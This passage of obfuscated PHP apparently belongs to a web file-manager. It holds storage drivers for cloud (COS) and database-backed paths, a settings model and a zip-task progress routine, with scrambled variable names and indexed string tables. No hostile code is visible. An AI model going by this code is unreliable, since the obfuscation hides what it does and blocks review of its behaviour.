!is_array($ÇÃ¸¨´Î[$á“îá…š[319]])) { return !1; } foreach ($ÇÃ¸¨´Î[$á“îá…š[319]] as $‰®×ÎÄ => $ÃÇª¾çÔ) { if (is_array($ÃÇª¾çÔ) && isset($ÃÇª¾çÔ[0]) && is_string($ÃÇª¾çÔ[0]) && strtolower($ÃÇª¾çÔ[0]) == $á“îá…š[7] && is_array($ÃÇª¾çÔ[1]) && count($ÃÇª¾çÔ[1]) > $°¢Òæ¡) { ignore_timeout(); return $‰®×ÎÄ; } } return !1; } public function setMasterDB($´–ÉÄÀê = true) { think_config($_SERVER[çâ¥×ø³][439], $´–ÉÄÀê); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\x6d\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($ãá¡›şî = false, $çŸŠ„À¶ = "\x6d\157\144\151\146\171\124\x69\x6d\145", $‹ÍÉÖ½ = false) { $ÂÊçûÎı = Model($this->modelType)->get(!1, $this->optionType, !0); $…µ’Íµò = array_values($ÂÊçûÎı); if ($…µ’Íµò && $…µ’Íµò[0] && !is_array($…µ’Íµò[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÂÊçûÎı = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÂÊçûÎı) { return $ãá¡›şî ? null : array(); } if (!$ãá¡›şî) { $ÂÊçûÎı = array_filter(array_values($ÂÊçûÎı)); return array_sort_by($ÂÊçûÎı, $çŸŠ„À¶, $‹ÍÉÖ½); } return $ÂÊçûÎı[$_SERVER[çâ¥×ø³][440] . $ãá¡›şî]; } public function insert($¬Û³Ş „) { $ÇªÕ½×í =& $_SERVER[çâ¥×ø³]; $¬Û³Ş „ = array_field_key($¬Û³Ş „, $this->field); $ğùÍ‹Ñ® = Model($this->modelType)->get($ÇªÕ½×í[441], $this->optionType . $ÇªÕ½×í[442]); $ğùÍ‹Ñ® = $ğùÍ‹Ñ® ? $ğùÍ‹Ñ® : 0; $¬Û³Ş „[$ÇªÕ½×í[443]] = ++$ğùÍ‹Ñ®; $¬Û³Ş „[$ÇªÕ½×í[215]] = time(); $¬Û³Ş „[$ÇªÕ½×í[85]] = time(); Model($this->modelType)->set($ÇªÕ½×í[441], $ğùÍ‹Ñ®, $this->optionType . $ÇªÕ½×í[442]); Model($this->modelType)->set($ÇªÕ½×í[440] . $ğùÍ‹Ñ®, $¬Û³Ş „, $this->optionType); return $ğùÍ‹Ñ®; } public function update($ãşœÏÑÇ, $ÉÎıŠÖ”) { $¨º€Şºã =& $_SERVER[çâ¥×ø³]; $ÉÎıŠÖ” = array_field_key($ÉÎıŠÖ”, $this->field); $òÍ±´É = $this->listData($ãşœÏÑÇ); if (!$òÍ±´É || !$ãşœÏÑÇ) { return !1; } $ÉÎıŠÖ” = array_merge($òÍ±´É, $ÉÎıŠÖ”); $ÉÎıŠÖ”[$¨º€Şºã[85]] = time(); return Model($this->modelType)->set($¨º€Şºã[440] . $ãşœÏÑÇ, $ÉÎıŠÖ”, $this->optionType); } public function remove($«›ì·˜÷) { if (!$«›ì·˜÷) { return !1; } return Model($this->modelType)->remove($_SERVER[çâ¥×ø³][440] . $«›ì·˜÷, $this->optionType); } public function clear() { $Ş½çêÇ =& $_SERVER[çâ¥×ø³]; Model($this->modelType)->remove($Ş½çêÇ[441], $this->optionType . $Ş½çêÇ[442]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($”¤üÜã½, $¿ˆ°’×») { if (!$¿ˆ°’×») { return !1; } $‡ƒÛ¡ƒ = $this->listData(); $‡ƒÛ¡ƒ = array_to_keyvalue($‡ƒÛ¡ƒ, $”¤üÜã½); return isset($‡ƒÛ¡ƒ[$¿ˆ°’×»]) ? $‡ƒÛ¡ƒ[$¿ˆ°’×»] : !1; } public function findByName($ĞíÛÚ¦Œ) { return $this->findByKey($_SERVER[çâ¥×ø³][32], $ĞíÛÚ¦Œ); } protected function resetData($ÓÀà…¥) { $Ì‰ÄÈÕ© =& $_SERVER[çâ¥×ø³]; $ÓÀà…¥ = is_array($ÓÀà…¥) ? $ÓÀà…¥ : array(); $ß©µ¿Èİ = array(); for ($Œš‚Ìï¢ = 0; $Œš‚Ìï¢ < count($ÓÀà…¥); $Œš‚Ìï¢++) { $ß©µ¿Èİ[$Ì‰ÄÈÕ©[440] . $ÓÀà…¥[$Œš‚Ìï¢][$Ì‰ÄÈÕ©[443]]] = $ÓÀà…¥[$Œš‚Ìï¢]; } return Model($this->modelType)->set($ß©µ¿Èİ, !1, $this->optionType); } private function getAutoName($„àÈ…ÈÈ) { $ıÁºçÈ© = array_to_keyvalue($this->listData(), $_SERVER[çâ¥×ø³][32]); if (!$ıÁºçÈ© || !isset($ıÁºçÈ©[$„àÈ…ÈÈ])) { return $„àÈ…ÈÈ; } for ($Öç³İ‘” = 1; $Öç³İ‘” < count($ıÁºçÈ©); $Öç³İ‘”++) { $»òñ¡şå = $„àÈ…ÈÈ . "\50{$Öç³İ‘”}\51"; if (!isset($ıÁºçÈ©[$»òñ¡şå])) { return $»òñ¡şå; } } return $»òñ¡şå; } } goto Fóç¬¾±«; cªĞö ÷©: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($»³ÕÓ³) { parent::__construct($»³ÕÓ³); $this->signatureVersion($_SERVER[çâ¥×ø³][231]); } public function uploadFormData($Ö¨ôàèÕ, $ÄàÛ¿óš = 3600) { $ôØ©¢› =& $_SERVER[çâ¥×ø³]; $¹Ä†¶øÑ = $ôØ©¢›[213]; $Ã‹•¼µ› = $ôØ©¢›[247]; $–©Ì‹Ù = $ôØ©¢›[257]; $ ÜÀºœ® = gmdate($ôØ©¢›[1377], time() + $ÄàÛ¿óš); $¹„Ï££§ = (string) time() . $ôØ©¢›[71] . (string) (time() + $ÄàÛ¿óš); $ùé–üÍ± = array($ôØ©¢›[258] => $ ÜÀºœ®, $ôØ©¢›[261] => array(array($ôØ©¢›[263] => $¹Ä†¶øÑ), array($ôØ©¢›[262] => $this->bucket), array($ôØ©¢›[264], $ôØ©¢›[265], $ôØ©¢›[12]), array($ôØ©¢›[268] => $–©Ì‹Ù), array($ôØ©¢›[1378] => $Ã‹•¼µ›), array($ôØ©¢›[1379] => $this->accessKey), array($ôØ©¢›[1380] => $¹„Ï££§))); $ùé–üÍ± = json_encode($ùé–üÍ±); $”´Üû—› = hash_hmac($ôØ©¢›[247], $¹„Ï££§, $this->secret); $ï¼ş•Æõ = sha1($ùé–üÍ±); $™Ö£È¾å = hash_hmac($ôØ©¢›[247], $ï¼ş•Æõ, $”´Üû—›); $²öÛ­É† = array($ôØ©¢›[263] => $¹Ä†¶øÑ, $ôØ©¢›[268] => $–©Ì‹Ù, $ôØ©¢›[276] => base64_encode($ùé–üÍ±), $ôØ©¢›[1378] => $Ã‹•¼µ›, $ôØ©¢›[1379] => $this->accessKey, $ôØ©¢›[1381] => $¹„Ï££§, $ôØ©¢›[1382] => $™Ö£È¾å, $ôØ©¢›[196] => $this->getHost()); return $²öÛ­É†; } public function fileOutLink($†ÑÀŞ—ä) { $™èà­£Ñ =& $_SERVER[çâ¥×ø³]; if (substr($†ÑÀŞ—ä, 0, 7) == $™èà­£Ñ[1383]) { $†ÑÀŞ—ä = $™èà­£Ñ[1384] . substr($†ÑÀŞ—ä, 7); } header($™èà­£Ñ[162] . $†ÑÀŞ—ä); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($š½ğ«Ü¡) { $this->pathParse = $š½ğ«Ü¡; $this->model = Model($_SERVER[çâ¥×ø³][1385]); } public function getPath($­¯•İñ) { return trim($­¯•İñ, $_SERVER[çâ¥×ø³][8]); } public function pathFather($ßéú÷™ô) { $ÍÃÙí­Ì = $this->parse($ßéú÷™ô); $ÍÃÙí­Ì = $this->infoSimple($ßéú÷™ô); return $ÍÃÙí­Ì ? $ÍÃÙí­Ì[$_SERVER[çâ¥×ø³][180]] : !1; } public function pathThis($ÇŒ‹ıûş) { $ì›ïºÉ = $this->infoSimple($ÇŒ‹ıûş); return $ì›ïºÉ ? $ì›ïºÉ[$_SERVER[çâ¥×ø³][32]] : !1; } public function getPathOuter($»÷”§ç ) { if (!$»÷”§ç ) { return $»÷”§ç ; } $Óã‚îÕ = $this->parse($»÷”§ç ); return KodIO::make($Óã‚îÕ[$_SERVER[çâ¥×ø³][443]]); } public function copyFolderFromIO($“¯£Ô£é, $»Û½˜‡î, $¸Ä£¼Ÿ’, $ƒ™¹„õ¹, $ì·Ş»êù) { $ÖÄ½ÌÎù = $this->model->copyFolderFromIO($“¯£Ô£é, $»Û½˜‡î, $¸Ä£¼Ÿ’, $ƒ™¹„õ¹, $ì·Ş»êù); return KodIO::make($ÖÄ½ÌÎù); } public function isParentOf($Ë¤Ú¸§æ, $Ù›­Ù) { return $this->model->isParentOf($Ë¤Ú¸§æ, $Ù›­Ù); } public function mkfile($›¼Ë«½Ì, $÷–æÁõ = '', $ÖÁÑ¾Í = REPEAT_RENAME) { $ô…¬´©ƒ =& $_SERVER[çâ¥×ø³]; $Îåø×Ã = $this->parse($›¼Ë«½Ì); $›¼Ë«½Ì = $Îåø×Ã[$ô…¬´©ƒ[443]]; for ($ÙñŞùêÜ = 0; $ÙñŞùêÜ < count($Îåø×Ã[$ô…¬´©ƒ[1386]]); $ÙñŞùêÜ++) { $¾Ÿš‘…º = $Îåø×Ã[$ô…¬´©ƒ[1386]][$ÙñŞùêÜ]; if ($ÙñŞùêÜ == count($Îåø×Ã[$ô…¬´©ƒ[1386]]) - 1) { $›¼Ë«½Ì = $this->model->mkfile($›¼Ë«½Ì, $¾Ÿš‘…º, $÷–æÁõ, $ÖÁÑ¾Í); break; } $›¼Ë«½Ì = $this->model->mkdir($›¼Ë«½Ì, $¾Ÿš‘…º, REPEAT_SKIP); } return $this->getPathOuter($›¼Ë«½Ì); } public function mkdir($·Ê‘—½‚, $îî¦‹ŸÒ = REPEAT_SKIP) { $ü·Ú®Šµ =& $_SERVER[çâ¥×ø³]; $ÔÀ‰Ş‰Â = $this->parse($·Ê‘—½‚); $·Ê‘—½‚ = $ÔÀ‰Ş‰Â[$ü·Ú®Šµ[443]]; for ($êÏ»·éä = 0; $êÏ»·éä < count($ÔÀ‰Ş‰Â[$ü·Ú®Šµ[1386]]); $êÏ»·éä++) { $Ê”ÍüĞ = $ÔÀ‰Ş‰Â[$ü·Ú®Šµ[1386]][$êÏ»·éä]; $·Ê‘—½‚ = $this->model->mkdir($·Ê‘—½‚, $Ê”ÍüĞ, $îî¦‹ŸÒ); } return $this->getPathOuter($·Ê‘—½‚); } public function copyFile($ÑŸ‰×³Ï, $œ¹œèº°, $……Ñ‹ıê = REPEAT_REPLACE) { $‚÷€ş¼„ =& $_SERVER[çâ¥×ø³]; $•Í£­Ñ = $this->parse($œ¹œèº°); $Ú™«ø¼Ò = $this->model->copy($ÑŸ‰×³Ï, $•Í£­Ñ[$‚÷€ş¼„[443]], $……Ñ‹ıê, $•Í£­Ñ[$‚÷€ş¼„[84]]); return $Ú™«ø¼Ò ? $this->getPathOuter($Ú™«ø¼Ò) : !1; } public function moveFile($®¨ø¾ö, $°Õ·“ Î, $Ôæ²î»ˆ = REPEAT_REPLACE) { $¡æš»Ú¦ =& $_SERVER[çâ¥×ø³]; $ì…¼ÆÕ = $this->parse($°Õ·“ Î); $Ïºé‰‘ = $this->model->move($®¨ø¾ö, $ì…¼ÆÕ[$¡æš»Ú¦[443]], $Ôæ²î»ˆ, $ì…¼ÆÕ[$¡æš»Ú¦[84]]); return $Ïºé‰‘ ? $this->getPathOuter($Ïºé‰‘) : !1; } public function copy($›Ğ˜ˆî, $ğÄÙ™Œ¾, $„Ó•‰ûó = REPEAT_REPLACE, $‘¬Ö¯·š = false) { $•é²ŸÄº = $this->parse($ğÄÙ™Œ¾); $Çí‰•±Ö = $this->model->copy($›Ğ˜ˆî, $•é²ŸÄº[$_SERVER[çâ¥×ø³][443]], $„Ó•‰ûó, $‘¬Ö¯·š); return $Çí‰•±Ö ? $this->getPathOuter($Çí‰•±Ö) : !1; } public function moveSameAllow() { } public function move($·òÔÑç±, $ø…»È€Ÿ, $Šô”¹´ƒ = REPEAT_REPLACE, $ñü«óŒÆ = false) { $ÔìÓ³†Ñ = $this->parse($ø…»È€Ÿ); $®ó½­Û = $this->model->move($·òÔÑç±, $ÔìÓ³†Ñ[$_SERVER[çâ¥×ø³][443]], $Šô”¹´ƒ, $ñü«óŒÆ); return $®ó½­Û ? $this->getPathOuter($®ó½­Û) : !1; } public function remove($’ü«ª¿Ç, $™‘¦†ˆı = true) { return $this->model->remove($’ü«ª¿Ç, $™‘¦†ˆı); } public function rename($ÃšÂ…¹…, $î¶ëúÇ) { $Ùñ¨îş = $this->model->rename($ÃšÂ…¹…, $î¶ëúÇ); return $Ùñ¨îş ? $this->getPathOuter($ÃšÂ…¹…) : $Ùñ¨îş; } public function size($•™ëÒ±Ä) { $‘¿ˆÕ– = $this->infoSimple($•™ëÒ±Ä); return $‘¿ˆÕ– ? $‘¿ˆÕ–[$_SERVER[çâ¥×ø³][76]] : 0; } public function infoSimple($íâÙıÈØ) { return $this->model->sourceInfo($íâÙıÈØ); } public function info($üßÁæÚŠ) { return $this->infoParse($üßÁæÚŠ); } public function infoAuth($½ÈÂ¬»Ó) { return $this->infoParse($½ÈÂ¬»Ó, !1, !0); } public function infoWithChildren($©ÆşşÇ¡) { return $this->infoParse($©ÆşşÇ¡, !0); } protected function infoParse($áÅù¨êô, $ÖığşÍì = false, $˜ãÀ±»ö = false) { if (!$ÖığşÍì) { return $this->model->pathInfo($áÅù¨êô, $˜ãÀ±»ö); } return $this->model->pathInfoMore($áÅù¨êô); } public function infoFullSimple($ØĞªîÓò) { $ˆ»âÄ´ =& $_SERVER[çâ¥×ø³]; $´ÊÎøÚš = explode($ˆ»âÄ´[8], $ØĞªîÓò); $à‡Ø£Õ¤ = implode($ˆ»âÄ´[8], array_splice($´ÊÎøÚš, 1)); return $this->model->pathInfoByPath($´ÊÎøÚš[0], $à‡Ø£Õ¤); } public function infoFull($ÙŸç¿‰–) { $úœ™à¸é = $this->infoFullSimple($ÙŸç¿‰–); return is_array($úœ™à¸é) ? $this->model->pathInfo($úœ™à¸é[$_SERVER[çâ¥×ø³][181]]) : !1; } public function hashSimple($±šÕş‰«) { $ßì¥‘Üë =& $_SERVER[çâ¥×ø³]; $«´–ìÔ¦ = $this->infoWithChildren($±šÕş‰«); return $«´–ìÔ¦[$ßì¥‘Üë[516]][$ßì¥‘Üë[640]]; } public function hashMd5($’õ´Ü¿ƒ) { $¢¹ò¯ç’ =& $_SERVER[çâ¥×ø³]; $…ëº»Ù› = $this->infoWithChildren($’õ´Ü¿ƒ); return $…ëº»Ù›[$¢¹ò¯ç’[516]][$¢¹ò¯ç’[641]]; } public function exist($«‰Ş¿—) { $”’Æ¿–œ =& $_SERVER[çâ¥×ø³]; $Ÿ‘¯ÇÖõ = $this->parse($«‰Ş¿—); if (!$Ÿ‘¯ÇÖõ[$”’Æ¿–œ[84]]) { return $this->isFile($«‰Ş¿—) || $this->isFolder($«‰Ş¿—); } $ÍÒÏ÷Æ… = array($”’Æ¿–œ[445] => $Ÿ‘¯ÇÖõ[$”’Æ¿–œ[443]], $”’Æ¿–œ[32] => $Ÿ‘¯ÇÖõ[$”’Æ¿–œ[84]]); $Úá±¡‰„ = $this->model->where($ÍÒÏ÷Æ…)->find(); return $Úá±¡‰„ ? !0 : !1; } public function isFile($¤“ıŠÄ¤) { $ÉÂ£ÂÉ =& $_SERVER[çâ¥×ø³]; $À³§àÙ¯ = $this->infoSimple($¤“ıŠÄ¤); return $À³§àÙ¯ && $À³§àÙ¯[$ÉÂ£ÂÉ[453]] == $ÉÂ£ÂÉ[212] ? !0 : !1; } public function isFolder($Ö•İÜˆ) { $•İÜá¯ =& $_SERVER[çâ¥×ø³]; $¢ ŒàŞ¢ = $this->infoSimple($Ö•İÜˆ); return $¢ ŒàŞ¢ && $¢ ŒàŞ¢[$•İÜá¯[453]] == $•İÜá¯[88] ? !0 : !1; } public function listPath($Å«éáÄ, $³êıëûò = false) { $âîÇğ¹ =& $_SERVER[çâ¥×ø³]; if ($Å«éáÄ == $âîÇğ¹[12]) { return !1; } $·î²„ì‚ = array($âîÇğ¹[445] => $Å«éáÄ); if ($³êıëûò) { return $this->model->listSource($·î²„ì‚, -1); } return $this->model->listSource($·î²„ì‚); } public function has($Ûéª Í, $¬éü©÷‡ = false, $ºƒóÌ€ = null) { $ßğçõŞÎ =& $_SERVER[çâ¥×ø³]; $«›ú…ş = $this->infoWithChildren($Ûéª Í); if ($¬éü©÷‡) { return array($ßğçõŞÎ[224] => $«›ú…ş[$ßğçõŞÎ[224]], $ßğçõŞÎ[223] => $«›ú…ş[$ßğçõŞÎ[223]]); } return $ºƒóÌ€ ? $«›ú…ş[$ßğçõŞÎ[224]] : $«›ú…ş[$ßğçõŞÎ[223]]; } public function listAll($Øâ¤÷Ï) { $ŸÙ½— = IO::info($this->pathParse[$_SERVER[çâ¥×ø³][84]]); if (!$ŸÙ½—) { return array(); } return $this->model->listAll($Øâ¤÷Ï); } public function getContent($ÖÛç±ö) { return $this->model->getContent($ÖÛç±ö); } public function setContent($ëÀòò°€, $Š¶ß¹ƒ = '') { return $this->model->setContent($ëÀòò°€, $Š¶ß¹ƒ); } public function fileSubstr($€Ñ‰Ï‚», $„áË©£, $ì¥î½Ğ¥) { return $this->model->fileSubstr($€Ñ‰Ï‚», $„áË©£, $ì¥î½Ğ¥); } public function download($Ó’ÕûıŞ, $Ò®ô–î‡ = '') { $ĞåÉ¯Ó = get_path_father($Ò®ô–î‡); $á˜ã§± = get_path_this($Ò®ô–î‡); $´ñ”ÒÕ = $this->model->fileInfoGet($Ó’ÕûıŞ); $¼òæŒéİ = IO::copy($´ñ”ÒÕ[$_SERVER[çâ¥×ø³][84]], $ĞåÉ¯Ó, !1, $á˜ã§±); return $¼òæŒéİ; } public function setModifyTime($…º¦„–´, $‘å÷¤¨· = '') { $è°ÄıØğ =& $_SERVER[çâ¥×ø³]; if (!$…º¦„–´) { return; } $this->model->where(array($è°ÄıØğ[459] => $…º¦„–´))->save(array($è°ÄıØğ[85] => $‘å÷¤¨·)); } public function upload($àòääùß, $­¬ŞÖî¶, $ßÖÃóˆ„ = false, $ Ö‹‘¶Ú = REPEAT_REPLACE) { $±–Ñ†Í³ =& $_SERVER[çâ¥×ø³]; $ÃÓ´ª´ = $this->parse($àòääùß); $Üê©„Äõ = $this->model->addFile($ÃÓ´ª´[$±–Ñ†Í³[443]], $­¬ŞÖî¶, $ÃÓ´ª´[$±–Ñ†Í³[84]], $ßÖÃóˆ„, $ Ö‹‘¶Ú); return $this->getPathOuter($Üê©„Äõ); } public function uploadFileByID($áâÏº‘ò, $Î²­¯¤Ì, $ÈøÄùœ¥) { $Ÿğª¸õì =& $_SERVER[çâ¥×ø³]; $ÁâÙíÓÉ = $this->parse($áâÏº‘ò); $’¯ÖÙØü = $this->model->addFileByFileID($ÁâÙíÓÉ[$Ÿğª¸õì[443]], $Î²­¯¤Ì, $ÁâÙíÓÉ[$Ÿğª¸õì[84]], $ÈøÄùœ¥); return $this->getPathOuter($’¯ÖÙØü); } public function addFileByRemote($ÄÜÖ‘‚­, $´½³şï, $ı«Íş = array(), $¶˜·ø“É = '', $½½ûÎÖœ) { $àÁÓ¿ =& $_SERVER[çâ¥×ø³]; $œ§ïÜÀÏ = $this->parse($ÄÜÖ‘‚­); $¶˜·ø“É = empty($¶˜·ø“É) ? $œ§ïÜÀÏ[$àÁÓ¿[84]] : $¶˜·ø“É; $æÓ¿„°¶ = $this->model->addFileByRemote($œ§ïÜÀÏ[$àÁÓ¿[443]], $´½³şï, $¶˜·ø“É, $ı«Íş, $½½ûÎÖœ); return $this->getPathOuter($æÓ¿„°¶); } public function uploadLink($§¸¿š Ï, $£†óğî³ = 0) { $áŒ¼ªü¥ =& $_SERVER[çâ¥×ø³]; $¥³ÜãÔë = $this->parse($§¸¿š Ï); $Òè‹ù½¦ = _get($GLOBALS[$áŒ¼ªü¥[7]], $áŒ¼ªü¥[1387]); $Â‰®‡ı = _get($GLOBALS[$áŒ¼ªü¥[7]], $áŒ¼ªü¥[1388]); $§¸¿š Ï = Model($áŒ¼ªü¥[643])->createFileName($¥³ÜãÔë[$áŒ¼ªü¥[84]], $Òè‹ù½¦, $Â‰®‡ı); return IO::uploadLink($§¸¿š Ï, $£†óğî³); } public function fileNameAuto($‘‰ˆŒÏå, $©Õ´ğè«, $ØÜìêµ¬ = REPEAT_REPLACE, $É§Ò™¸’ = false) { return $this->model->fileNameAuto($‘‰ˆŒÏå, $©Õ´ğè«, $ØÜìêµ¬, $É§Ò™¸’); } public function fileNameExist($§ı©Ëå, $°¢´èêâ) { return $this->model->fileNameExist($§ı©Ëå, $°¢´èêâ); } protected function _fileOut($Ğ×¦Ö®, $»‚…‰í° = false, $ğ úã§ = false, $ˆòÛ²ÖÒ = '', $Õ•†ŠÜ’ = false) { $„Ù€çªœ =& $_SERVER[çâ¥×ø³]; $úŸ¹µ¤ = $this->model->sourceInfo($Ğ×¦Ö®); if ($úŸ¹µ¤[$„Ù€çªœ[453]] == $„Ù€çªœ[88]) { header($„Ù€çªœ[1389]); die; } $üò‹Ä¨Õ = $this->model->fileInfoGet($Ğ×¦Ö®); $ˆòÛ²ÖÒ = $üò‹Ä¨Õ[$„Ù€çªœ[641]] ? $üò‹Ä¨Õ[$„Ù€çªœ[641]] : $ˆòÛ²ÖÒ; $ØÌ÷‹¡Ù = is_array($GLOBALS[$„Ù€çªœ[169]]) ? $GLOBALS[$„Ù€çªœ[169]][$„Ù€çªœ[32]] : $úŸ¹µ¤[$„Ù€çªœ[32]]; if ($Õ•†ŠÜ’) { return IO::fileOutServer($üò‹Ä¨Õ[$„Ù€çªœ[84]], $»‚…‰í°, $ØÌ÷‹¡Ù, $ˆòÛ²ÖÒ); } IO::fileOut($üò‹Ä¨Õ[$„Ù€çªœ[84]], $»‚…‰í°, $ØÌ÷‹¡Ù, $ˆòÛ²ÖÒ); } public function fileOut($ú¡Ÿú©Ò, $İÒ¾ß‰’ = false, $”üÔ¶Šó = false, $ùí“¦Ÿ = '') { $this->_fileOut($ú¡Ÿú©Ò, $İÒ¾ß‰’, $”üÔ¶Šó, $ùí“¦Ÿ); } public function fileOutServer($¢Ó–ÒêÖ, $µ‰ıÔˆİ = false, $¼¨„ö‚¢ = false, $Ğ±¶ì’Ø = '') { $this->_fileOut($¢Ó–ÒêÖ, $µ‰ıÔˆİ, $¼¨„ö‚¢, $Ğ±¶ì’Ø, !0); } protected function _fileOutImage($Œ¸Ó»ìÍ, $Œ¨šË = 250) { $Ÿ¶ş¾ÃÊ =& $_SERVER[çâ¥×ø³]; $®õé¹ß¦ = $this->model->pathInfo($Œ¸Ó»ìÍ); if ($®õé¹ß¦[$Ÿ¶ş¾ÃÊ[453]] == $Ÿ¶ş¾ÃÊ[88]) { show_json($Ÿ¶ş¾ÃÊ[1390] . $Œ¸Ó»ìÍ, !1); } $«‘ÊÔ£ = $this->model->fileInfoGet($Œ¸Ó»ìÍ); $®õé¹ß¦[$Ÿ¶ş¾ÃÊ[170]] = $«‘ÊÔ£[$Ÿ¶ş¾ÃÊ[84]]; $GLOBALS[$Ÿ¶ş¾ÃÊ[169]] = $®õé¹ß¦; IO::fileOutImage($«‘ÊÔ£[$Ÿ¶ş¾ÃÊ[84]], $Œ¨šË); } public function fileOutImage($€Ğ‚‚­Î, $š­¶Âµ§ = 250) { $this->_fileOutImage($€Ğ‚‚­Î, $š­¶Âµ§); } public function fileOutImageServer($¿êÌé•ò, $¨ÍÅâóÄ = 250) { $this->_fileOutImage($¿êÌé•ò, $¨ÍÅâóÄ); } public function link($­§˜ˆ², $ø¬°Š³ê = '') { $€ÍŞÔ•¬ = $this->model->fileInfoGet($­§˜ˆ²); return IO::link($€ÍŞÔ•¬[$_SERVER[çâ¥×ø³][84]], $ø¬°Š³ê); } protected function parse($ÚÒĞÊ·”) { $½ô¿«ÒË =& $_SERVER[çâ¥×ø³]; if (strstr($ÚÒĞÊ·”, $½ô¿«ÒË[8]) === !1) { return array($½ô¿«ÒË[461] => intval($ÚÒĞÊ·”), $½ô¿«ÒË[84] => $½ô¿«ÒË[12], $½ô¿«ÒË[1386] => array()); } $”‡©øõ– = explode($½ô¿«ÒË[8], trim($ÚÒĞÊ·”, $½ô¿«ÒË[8])); if (count($”‡©øõ–) < 2) { show_tips(clear_html($ÚÒĞÊ·”) . $½ô¿«ÒË[1391]); } return array($½ô¿«ÒË[461] => intval($”‡©øõ–[0]), $½ô¿«ÒË[84] => $”‡©øõ–[1], $½ô¿«ÒË[1386] => array_slice($”‡©øõ–, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ü€Ê¢ø¾) { $this->pathParse = $ü€Ê¢ø¾; $this->model = Model($_SERVER[çâ¥×ø³][1385]); } public function getPathOuter($øÑëçù) { $³È¦»Ê =& $_SERVER[çâ¥×ø³]; if (!$øÑëçù) { return $øÑëçù; } $˜ºì¦˜Ê = $this->parse($øÑëçù); return trim(KodIO::makeShare($this->pathParse[$³È¦»Ê[443]], $˜ºì¦˜Ê[$³È¦»Ê[443]]), $³È¦»Ê[8]); } protected function infoParse($¾²·—¥, $ØÈ€©òè = false, $¬òúŞåÎ = false) { $¿ø¥õ¯ =& $_SERVER[çâ¥×ø³]; $½¨Ì¢›à = $this->pathParse[$¿ø¥õ¯[443]]; $£ßÔúÇô = trim($this->pathParse[$¿ø¥õ¯[1221]], $¿ø¥õ¯[8]); return Action($¿ø¥õ¯[1392])->sharePathInfo($½¨Ì¢›à, $£ßÔúÇô, $ØÈ€©òè); } public function infoFull($³¨Ö×ÑË) { $¦Í’¦Û„ =& $_SERVER[çâ¥×ø³]; $½²§òùä = explode($¦Í’¦Û„[8], trim($³¨Ö×ÑË, $¦Í’¦Û„[8])); if (count($½²§òùä) > 1) { $Ì£ìğİø = implode($¦Í’¦Û„[8], array_splice($½²§òùä, 1)); $•äÀ…µÁ = $this->model->pathInfoByPath($½²§òùä[0], $Ì£ìğİø); if (!$•äÀ…µÁ) { return !1; } $this->pathParse[$¦Í’¦Û„[1221]] = $•äÀ…µÁ[$¦Í’¦Û„[181]]; } return $this->infoParse($³¨Ö×ÑË); } public function listAll($ÕĞ€ä¥í) { $øé¯€—‡ =& $_SERVER[çâ¥×ø³]; $È£ªùû = IO::info($this->pathParse[$øé¯€—‡[84]]); if (!$È£ªùû) { return array(); } $ÄÇ™‡‹° = $this->model->listAll($ÕĞ€ä¥í); $ƒâÃ„ß = Model($øé¯€—‡[632])->getInfo($È£ªùû[$øé¯€—‡[633]]); foreach ($ÄÇ™‡‹° as &$¸æÓÖ¨‡) { check_abort(); $¸æÓÖ¨‡[$øé¯€—‡[87]] = Action($øé¯€—‡[1392])->_shareItemeParse($¸æÓÖ¨‡[$øé¯€—‡[87]], $ƒâÃ„ß); } unset($¸æÓÖ¨‡); return $ÄÇ™‡‹°; } } goto AŒµà“«°; f¤†Ñ·°À­: class TaskZip extends TaskFileTransfer { protected function startAfter() { $®µåÍº™ =& $_SERVER[çâ¥×ø³]; parent::startAfter(); Hook::bind($®µåÍº™[1825], array($this, $®µåÍº™[1815])); Hook::bind($®µåÍº™[1817], array($this, $®µåÍº™[1818])); $ÅôÆ¡˜° =& $this->task; $ÅôÆ¡˜°[$®µåÍº™[1819]] = $®µåÍº™[1247]; if (!$ÅôÆ¡˜°[$®µåÍº™[1598]]) { $ÅôÆ¡˜°[$®µåÍº™[1598]] = LNG($®µåÍº™[1826]); } } protected function endAfter() { $îùÑ÷² =& $_SERVER[çâ¥×ø³]; parent::endAfter(); Hook::unbind($îùÑ÷²[1825], array($this, $îùÑ÷²[1815])); Hook::unbind($îùÑ÷²[1817], array($this, $îùÑ÷²[1818])); } public function updateAfter() { $˜‡İûí¢ =& $_SERVER[çâ¥×ø³]; $îÏ—¾ñ =& $this->task; if (!$îÏ—¾ñ[$˜‡İûí¢[835]] || !$îÏ—¾ñ[$˜‡İûí¢[812]]) { return; } if ($îÏ—¾ñ[$˜‡İûí¢[1819]] == $˜‡İûí¢[1247]) { $Ì‰šğğà = $îÏ—¾ñ[$˜‡İûí¢[1755]]; if ($îÏ—¾ñ[$˜‡İûí¢[1756]] != $˜‡İûí¢[1247]) { $Ì‰šğğà = 0; } $ğùéê½ = ($îÏ—¾ñ[$˜‡İûí¢[1759]] + $Ì‰šğğà) / $îÏ—¾ñ[$˜‡İûí¢[812]]; $îÏ—¾ñ[$˜‡İûí¢[1703]] = $ğùéê½ * 0.3; } else { if ($îÏ—¾ñ[$˜‡İûí¢[1819]] == $˜‡İûí¢[357]) { $ğùéê½ = $îÏ—¾ñ[$˜‡İûí¢[1702]] / $îÏ—¾ñ[$˜‡İûí¢[835]]; $îÏ—¾ñ[$˜‡İûí¢[1703]] = 0.3 + $ğùéê½ * 0.5; } else { if ($îÏ—¾ñ[$˜‡İûí¢[1819]] == $˜‡İûí¢[107]) { $ğùéê½ = 0; if ($îÏ—¾ñ[$˜‡İûí¢[1754]]) { $ğùéê½ = $îÏ—¾ñ[$˜‡İûí¢[1755]] / $îÏ—¾ñ[$˜‡İûí¢[1754]]; } $îÏ—¾ñ[$˜‡İûí¢[1703]] = 0.3 + 0.5 + $ğùéê½ * 0.2; } } } if ($îÏ—¾ñ[$˜‡İûí¢[1703]] > 0) { $ó“‰ËÙ‘ = timeFloat() - $îÏ—¾ñ[$˜‡İûí¢[1705]] - $îÏ—¾ñ[$˜‡İûí¢[1708]]; $îÏ—¾ñ[$˜‡İûí¢[1709]] = 